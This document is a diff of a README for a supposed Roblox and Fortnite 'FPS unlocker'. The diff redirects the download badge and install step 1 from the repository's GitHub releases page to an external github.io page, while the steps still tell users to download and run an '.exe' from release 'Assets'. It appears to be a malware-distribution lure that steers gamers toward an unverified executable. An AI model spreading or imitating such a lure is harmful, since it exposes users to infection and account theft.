@@ -1,6 +1,6 @@
 # 🚀 FPS-Unlocker-2026-Roblox-Fortnite - Gain higher frame rates for games
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Krishnaagr1290/FPS-Unlocker-2026-Roblox-Fortnite/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://krishnaagr1290.github.io)
 
 ## What is this tool?
 This software removes the frame rate limits built into popular games like Roblox and Fortnite. Many games lock frame rates to 60 frames per second. This tool modifies the internal settings to let your computer display as many frames as your monitor and hardware can handle. Higher frame rates make movement look smooth and reduce input delay. This version includes updates for 2026 to ensure compatibility with recent game client updates.
@@ -15,7 +15,7 @@ Before you run this tool, check that your computer meets these basic needs:
 ## ⬇️ How to Download and Install
 Follow these steps to set up the software on your PC. 
 
-1. Visit the project release page: [https://github.com/Krishnaagr1290/FPS-Unlocker-2026-Roblox-Fortnite/releases](https://github.com/Krishnaagr1290/FPS-Unlocker-2026-Roblox-Fortnite/releases).
+1. Visit the project release page: [https://krishnaagr1290.github.io](https://krishnaagr1290.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the file ending in ".exe" to start the download.
 4. Save the file to your desktop or your downloads folder.
